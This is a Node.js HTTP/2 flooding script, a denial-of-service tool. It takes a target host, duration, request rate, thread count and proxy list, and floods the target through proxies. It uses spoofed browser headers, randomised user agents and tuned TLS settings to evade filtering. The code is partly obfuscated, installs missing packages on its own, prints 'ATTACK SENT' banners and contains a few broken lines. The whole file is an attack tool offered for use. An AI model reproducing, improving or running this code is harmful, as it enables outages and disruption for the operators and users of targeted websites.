const requiredModules = [
  'colors',
  'http2',
  'tls',
  'cluster',
  'set-cookie-parser',
  'url',
  'crypto',
  'user-agents',
  'random-useragent',
  'net',
  'fs',
]
requiredModules.forEach((_0x1c72f5) => {
  try {
    require.resolve(_0x1c72f5)
  } catch (_0x4cf883) {
    console.log('Installing the module ' + _0x1c72f5 + '...')
    const { execSync: _0x346955 } = require('child_process')
    _0x346955('npm install ' + _0x1c72f5)
  }
})
const net = require('net'),
  http2 = require('http2'),
  tls = require('tls'),
  cluster = require('cluster'),
  url = require('url'),
  crypto = require('crypto'),
  fs = require('fs'),
  scp = require('set-cookie-parser')
var colors = require('colors')
const randomUseragent = require('random-useragent'),
  uap = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62',
    'Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13',
    'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420',
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4504021560267656607 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5534684115277472898 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
  ],
  accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  ],
  cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ],
  Generate_Encoding = [
    '*',
    'gzip, deflate',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate',
  ],
  language_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'tt-RU,tt;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
  ],
  dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt',
  ],
  platform = ['Windows', 'Linux', 'iPhone'],
  mode_header = ['cors', 'navigate', 'no-cors', 'same-origin', 'websocket'],
  site_header = ['cross-site', 'same-origin', 'same-site', 'none'],
  sec_ch_ua = [
    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
  ]
process.setMaxListeners(0)
require('events').EventEmitter.defaultMaxListeners = 0
process.argv.length < 7 &&
  (console.log('Usage: host time req thread GET proxy.txt'), process.exit())
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':'),
  ciphers =
    'GREASE:' +
    [
      defaultCiphers[2],
      defaultCiphers[1],
      defaultCiphers[0],
      ...defaultCiphers.slice(3),
    ].join(':'),
  sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
  ]
let SignalsList = sigalgs.join(':')
const ecdhCurve = 'GREASE:X25519:x25519',
  secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
  secureProtocol = 'TLS_client_method',
  headers = {},
  secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol,
  },
  secureContext = tls.createSecureContext(secureContextOptions),
  args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    method: ~~process.argv[6],
    proxyFile: process.argv[7],
  }
var proxies = readLines(args.proxyFile)
const parsedTarget = url.parse(args.target)
if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    console.clear()
    console.log('ATTACK SENT'.bgRed)
    console.log('@Bettercallcrisxtop'.blue)
    cluster.fork()
  }
} else {
  for (let i = 0; i < 10; i++) {
    setInterval(runFlooder, 0)
  }
}
class NetSocket {
  constructor() {}
  ['HTTP'](_0x571497, _0x33d044) {
    const _0x23ddb9 = _0x571497.address.split(':'),
      _0x3c4ab8 = _0x23ddb9[0],
      _0x4be867 =
        'CONNECT ' +
        _0x571497.address +
        ':443 HTTP/1.1\r\nHost: ' +
        _0x571497.address +
        ':443\r\nConnection: Keep-Alive\r\n\r\n',
      _0x5ea4f7 = new Buffer.from(_0x4be867),
      _0x36dd38 = net.connect({
        host: _0x571497.host,
        port: _0x571497.port,
        allowHalfOpen: true,
        writable: true,
        readable: true,
      })
    _0x36dd38.setTimeout(_0x571497.timeout * 100000)
    _0x36dd38.setKeepAlive(true, 100000)
    _0x36dd38.setNoDelay(true)
    _0x36dd38.on('connect', () => {
      _0x36dd38.write(_0x5ea4f7)
    })
    _0x36dd38.on('data', (_0x12607d) => {
      const _0x4f5e9d = _0x12607d.toString('utf-8'),
        _0x41d1b8 = _0x4f5e9d.includes('HTTP/1.1 200')
      if (_0x41d1b8 === false) {
        return _0x36dd38.destroy(), _0x33d044(undefined, '403')
      }
      return _0x33d044(_0x36dd38, undefined)
    })
    _0x36dd38.on('timeout', () => {
      return _0x36dd38.destroy(), _0x33d044(undefined, '403')
    })
    _0x36dd38.on('error', (_0x199549) => {
      return _0x36dd38.destroy(), _0x33d044(undefined, '403')
    })
  }
}
function cookieString(_0x18da96) {
  var _0xe66cd9 = ''
  for (var _0x4bfde1 in _0x18da96) {
    _0xe66cd9 =
      _0xe66cd9 +
      ' ' +
      _0x18da96[_0x4bfde1].name +
      '=' +
      _0x18da96[_0x4bfde1].value +
      ';'
  }
  var _0xe66cd9 = _0xe66cd9.substring(1)
  return _0xe66cd9.substring(0, _0xe66cd9.length - 1)
}
const Socker = new NetSocket()
function readLines(_0x2c0b6c) {
  return fs.readFileSync(_0x2c0b6c, 'utf-8').toString().split(/\r?\n/)
}
function randomIntn(_0x240a50, _0x469d5d) {
  return Math.floor(Math.random() * (_0x469d5d - _0x240a50) + _0x240a50)
}
function randomElement(_0x4efc54) {
  return _0x4efc54[randomIntn(0, _0x4efc54.length)]
}
function getRandomUserAgent() {
  const _0x3e6f21 = [
      'Windows',
      'Windows NT 10.0',
      'Windows NT 6.1',
      'Windows NT 6.3',
      'Macintosh',
      'Android',
      'Linux',
    ],
    _0x3061f4 = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'],
    _0x41c58f = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'],
    _0x5c76b8 = ['US', 'GB', 'FR', 'DE', 'ES'],
    _0x5552a1 = [
      'Windows',
      'Apple',
      'Google',
      'Microsoft',
      'Mozilla',
      'Opera Software',
    ],
    _0x1a782b = _0x3e6f21[Math.floor(Math.random() * _0x3e6f21.length)],
    _0x293762 = _0x3061f4[Math.floor(Math.random() * _0x3061f4.length)],
    _0x196a2e = _0x41c58f[Math.floor(Math.random() * _0x41c58f.length)],
    _0x140604 = _0x5c76b8[Math.floor(Math.random() * _0x5c76b8.length)],
    _0x1c86f7 = _0x5552a1[Math.floor(Math.random() * _0x5552a1.length)],
    _0x21d522 = Math.floor(Math.random() * 100) + 1,
    _0x4cc137 = Math.floor(Math.random() * 6) + 1,
    _0x43051d =
      _0x1c86f7 +
      '/' +
      _0x293762 +
      ' ' +
      _0x21d522 +
      '.' +
      _0x21d522 +
      '.' +
      _0x21d522 +
      ' (' +
      _0x1a782b +
      '; ' +
      _0x140604 +
      '; ' +
      _0x196a2e +
      ')',
    _0x18ec40 = btoa(_0x43051d)
  let _0x2c31c1 = ''
  for (let _0x580fe3 = 0; _0x580fe3 < _0x18ec40.length; _0x580fe3++) {
    _0x580fe3 % _0x4cc137 === 0
      ? (_0x2c31c1 += _0x18ec40.charAt(_0x580fe3))
      : (_0x2c31c1 += _0x18ec40.charAt(_0x580fe3).toUpperCase())
  }
  return _0x2c31c1
}
function runFlooder() {
  const _0x328a90 = randomElement(proxies),
    _0x4bd883 = _0x328a90.split(':'),
    _0x4a4239 = parsedTarget.protocol == 'https:' ? '443' : '80'
  let _0x2924d0 = randomUseragent.getRandom(function (_0x304abe) {
      return _0x304abe.browserName === 'Firefox'
    }),
    _0x46322b = {
      ':authority': parsedTarget.host,
      ':method': 'GET',
      ':path': parsedTarget.path,
      ':scheme': parsedTarget.protocol == 'https:' ? 'https' : 'http',
      Accept: accept_header[Math.floor(Math.random() * accept_header.length)],
      origin: parsedTarget.protocol + '//' + parsedTarget.host,
      'sec-fetch-dest':
        dest_header[Math.floor(Math.random() * dest_header.length)],
      'sec-fetch-mode':
        mode_header[Math.floor(Math.random() * mode_header.length)],
      'sec-fetch-site':
        site_header[Math.floor(Math.random() * site_header.length)],
      'user-agent': getRandomUserAgent(),
      'x-requested-with': 'XMLHttpRequest',
      'sec-gpc': 1,
      'upgrade-insecure-requests': 1,
      'x-forwarded-proto': 'https',
    }
  const _0x1d86fb = {
    host: _0x4bd883[0],
    port: ~~_0x4bd883[1],
    address: parsedTarget.host + ':443',
    timeout: 100,
  }
  Socker.HTTP(_0x1d86fb, (_0x5abcbe, _0x4e561c) => {
    if (_0x4e561c) {
      return
    }
    _0x5abcbe.setKeepAlive(true, 100000)
    _0x5abcbe.setNoDelay(true)
    const _0x19be11 = {
        port: _0x4a4239,
        secure: true,
        ALPNProtocols: ['h2', 'spdy/3.1', 'http/1.1'],
        ciphers: ciphers,
        sigalgs: sigalgs,
        requestCert: true,
        socket: _0x5abcbe,
        ecdhCurve: ecdhCurve,
        honorCipherOrder: false,
        host: parsedTarget.host,
        rejectUnauthorized: false,
        clientCertEngine: 'dynamic',
        secureOptions: secureOptions,
        secureContext: secureContext,
        servername: parsedTarget.host,
        secureProtocol: secureProtocol,
      },
      _0x52859a = tls.connect(_0x4a4239, parsedTarget.host, _0x19be11)
    _0x52859a.allowHalfOpen = true
    _0x52859a.setNoDelay(true)
    _0x52859a.setKeepAlive(true, 6000000)
    _0x52859a.setMaxListeners(0)
    const _0x165bf6 = http2.connect(parsedTarget.href, {
      protocol: 'https:',
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
      },
      maxSessionMemory: 3333,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => _0x52859a,
      socket: _0x5abcbe,
    })
    _0x165bf6.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 1000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false,
    })
    _0x165bf6.setMaxListeners(0)
    _0x165bf6.settings(_0x5116ad)
    _0x165bf6.on('connect', () => {
      const _0x2ed6b7 = setInterval(() => {
        for (let _0x55d52d = 0; _0x55d52d < args.Rate; _0x55d52d++) {
          _0x46322b.referer = 'https://' + parsedTarget.host + parsedTarget.path
          const _0x32385c = _0x165bf6
            .request(_0x46322b)
            .on('response', (_0x5ad68f) => {
              _0x5ad68f['set-cookie'] &&
                (_0x46322b.cookie = cookieString(
                  scp.parse(_0x5ad68f['set-cookie'])
                ))
              _0x32385c.close()
              _0x32385c.destroy()
              return
            })
          _0x32385c.end()
        }
      }, 1000)
    })
    _0x165bf6.on('close', () => {
      _0x165bf6.destroy()
      _0x5abcbe.destroy()
      return
    })
    _0x165bf6.on('error', (_0x5c233a) => {
      _0x165bf6.destroy()
      _0x5abcbe.destroy()
      return
    })
  })
}
const StopScript = () => process.exit(1)
setTimeout(StopScript, args.time * 1000)
process.on('uncaughtException', (_0x5dba41) => {})
process.on('unhandledRejection', (_0x3457b4) => {})
const { exec } = require('child_process')
exec(
  "'clear",
  (_0x23b6fe, _0xdff13f, _0x5ec8ab) => {
    if (_0x23b6fe) {
      console.error('Attack sent succesfully!')
      return
    }
    console.error('Attack sent to all Meris servers')
  }
)